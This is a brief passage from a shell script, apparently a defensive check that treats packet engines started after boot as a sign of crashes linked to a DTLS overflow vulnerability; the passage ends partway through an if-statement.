     # Packet engines started after boot = crashed and restarted (possible CVE-2026-88772 DTLS overflow);
     # works even when the crash lines have rotated out of the logs
     if [ -n "$BOOT" ]; then
